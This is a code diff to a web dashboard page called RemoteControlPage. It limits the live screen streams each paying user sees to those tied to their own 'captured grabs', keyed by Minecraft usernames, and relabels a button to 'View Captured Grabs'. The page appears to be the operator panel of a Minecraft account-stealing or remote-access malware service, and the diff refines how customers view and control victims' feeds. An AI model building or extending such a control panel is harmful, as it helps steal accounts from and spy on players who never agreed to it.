@@ -80,48 +80,60 @@ export default function RemoteControlPage() {
 
     const fetchAllStreams = async () => {
       try {
-        const [streamRes, webrtcRes] = await Promise.all([
+        const isAdmin = ADMIN_EMAILS.includes(userEmail.toLowerCase());
+
+        const [streamRes, webrtcRes, grabsRes] = await Promise.all([
           fetch('/api/stream?t=' + Date.now()).then((r) => r.json()).catch(() => ({ online: [] })),
           fetch('/api/livestream/webrtc?action=list&t=' + Date.now()).then((r) => r.json()).catch(() => ({ streams: [] })),
+          fetch('/api/grabs?t=' + Date.now()).then((r) => r.json()).catch(() => ({ grabs: [] })),
         ]);
 
-        const streamsMap = new Map();
+        // Build allowed targets set from user's own grabs
+        const allowedUsernames = new Set();
+        const grabsList = grabsRes.grabs || [];
+        for (const g of grabsList) {
+          if (g.minecraft_username) allowedUsernames.add(g.minecraft_username.toLowerCase().trim());
+          if (g.id) allowedUsernames.add(g.id.toLowerCase().trim());
+        }
 
-        // From /api/stream
+        const streamsMap = new Map();
+        const now = Date.now();
+
+        // From /api/stream (strictly within last 10s and belonging to user's grabs)
         if (streamRes.online && Array.isArray(streamRes.online)) {
           for (const u of streamRes.online) {
             if (u.username) {
-              streamsMap.set(u.username.toLowerCase(), {
-                username: u.username,
-                type: u.type || 'ConsentMod Feed',
-                country: u.country || null,
-                timestamp: u.timestamp || Date.now(),
-              });
+              const lower = u.username.toLowerCase().trim();
+              const ts = u.timestamp || now;
+              if (now - ts < 10000 && (isAdmin || allowedUsernames.has(lower))) {
+                streamsMap.set(lower, {
+                  username: u.username,
+                  type: u.type || 'ConsentMod Feed',
+                  country: u.country || null,
+                  timestamp: ts,
+                });
+              }
             }
           }
         }
 
-        // From WebRTC active broadcast rooms
+        // From WebRTC active broadcast rooms (strictly within last 10s and belonging to user's grabs)
         if (webrtcRes.streams && Array.isArray(webrtcRes.streams)) {
           for (const s of webrtcRes.streams) {
-            const name = s.metadata?.username || s.streamId || 'WebRTC Broadcaster';
-            streamsMap.set(name.toLowerCase(), {
-              username: name,
-              type: 'WebRTC P2P (60 FPS)',
-              country: null,
-              timestamp: s.lastSeen || Date.now(),
-            });
+            const name = s.metadata?.username || s.streamId || '';
+            if (name) {
+              const lower = name.toLowerCase().trim();
+              const ts = s.lastSeen || now;
+              if (now - ts < 10000 && (isAdmin || allowedUsernames.has(lower))) {
+                streamsMap.set(lower, {
+                  username: name,
+                  type: 'WebRTC P2P (60 FPS)',
+                  country: null,
+                  timestamp: ts,
+                });
+              }
+            }
           }
-        }
-
-        // Ensure consentmod channel is always available for instant WebRTC P2P connection
-        if (!streamsMap.has('consentmod')) {
-          streamsMap.set('consentmod', {
-            username: 'consentmod',
-            type: 'WebRTC P2P Live',
-            country: 'Default Stream',
-            timestamp: Date.now(),
-          });
         }
 
         setOnlineUsers(Array.from(streamsMap.values()));
@@ -132,9 +144,9 @@ export default function RemoteControlPage() {
     };
 
     fetchAllStreams();
-    const iv = setInterval(fetchAllStreams, 3000);
+    const iv = setInterval(fetchAllStreams, 2500);
     return () => clearInterval(iv);
-  }, [proChecked, isPro]);
+  }, [proChecked, isPro, userEmail]);
 
   if (!proChecked) {
     return (
@@ -283,7 +295,7 @@ export default function RemoteControlPage() {
                 Start WebRTC Broadcast
               </button>
               <button
-                onClick={() => router.push('/dashboard/remote-control/consentmod')}
+                onClick={() => router.push('/dashboard/grabs')}
                 style={{
                   padding: '9px 16px',
                   borderRadius: 8,
@@ -294,7 +306,7 @@ export default function RemoteControlPage() {
                   cursor: 'pointer',
                 }}
               >
-                Connect to ConsentMod Feed
+                View Captured Grabs ↗
               </button>
             </div>
           </div>
